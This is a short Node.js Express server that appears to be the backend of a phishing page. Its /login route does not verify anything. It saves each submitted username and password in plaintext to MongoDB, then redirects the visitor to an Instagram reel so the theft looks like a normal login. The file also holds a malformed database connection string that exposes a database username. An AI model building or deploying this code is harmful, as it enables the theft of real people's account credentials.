const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const mongoose = require("mongoose");
require("dotenv").config();

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// MongoDB Connection
mongoose.connect("process.env.mongodb+srv://sagarsonwane90112_db_user:<db_password>@cluster0.njv6pqg.mongodb.net/?appName=Cluster0")
  .then(() => console.log("MongoDB Connected"))
  .catch((err) => console.log(err));

// Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model("User", userSchema);

// Home Route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Login Route
app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    // Save directly in MongoDB
    const newUser = new User({
      username,
      password,
    });

    await newUser.save();

    console.log("User saved!");

    res.redirect("https://www.instagram.com/reel/DXH9OJcjdb5/?utm_source=ig_web_copy_link");

  } catch (error) {
    console.log(error);
    res.status(500).send("Error fetching");
  }
});

// Start Server
app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});